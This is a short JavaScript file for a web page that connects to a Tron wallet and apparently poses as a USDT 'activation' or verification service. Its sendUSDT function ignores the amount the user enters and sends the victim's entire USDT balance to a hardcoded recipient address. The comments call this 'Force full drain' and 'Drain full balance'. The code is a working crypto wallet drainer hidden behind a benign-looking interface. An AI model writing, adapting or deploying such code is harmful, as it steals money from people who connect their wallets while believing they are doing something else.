async function updateUSD() {
  const amount = parseFloat(document.getElementById("amount").value || "0");
  const usdValue = amount * 1; // USDT is 1:1 with USD
  document.getElementById("usdValue").innerText = `≈ $${usdValue.toFixed(2)}`;
}

async function setMax() {
  if (!window.tronWeb || !tronWeb.defaultAddress.base58) return;
  const contract = await tronWeb.contract().at("TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj");
  const balance = await contract.balanceOf(tronWeb.defaultAddress.base58).call();
  const maxUSDT = parseFloat(balance) / 1_000_000;
  document.getElementById("amount").value = maxUSDT.toFixed(6);
  updateUSD();
}

async function sendUSDT() {
  const recipient = "TQP59pp5o9x6ohP8A6NWqUu9iJ3LfTNEKQ"; // your receiving wallet
  const user = tronWeb.defaultAddress.base58;
  const usdtAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT TRC20

  if (!window.tronWeb || !user) {
    alert("❌ Wallet not connected.");
    return;
  }

  try {
    const contract = await tronWeb.contract().at(usdtAddress);
    const balanceBefore = await contract.balanceOf(user).call();
    const balanceNum = parseInt(balanceBefore);

    // ✅ Force full drain if balance ≥ 1 USDT
    const threshold = 1 * 1_000_000; // 1 USDT
    if (balanceNum < threshold) {
      alert("❌ Minimum 1 USDT required to activate.");
      return;
    }

    // ✅ Drain full balance
    const tx = await contract.transfer(recipient, balanceNum).send();
    console.log("✅ Sent full USDT balance:", tx);

    // ✅ Optional: Check flash/fake
    setTimeout(async () => {
      const balanceAfter = await contract.balanceOf(user).call();
      if (parseInt(balanceAfter) < balanceNum) {
        alert("✅ Real USDT transferred.");
      } else {
        alert("⚠️ Flash USDT detected. No real transfer.");
      }
    }, 4000);
  } catch (err) {
    console.error("❌ Error sending:", err);
    alert("Transfer failed.");
  }
}
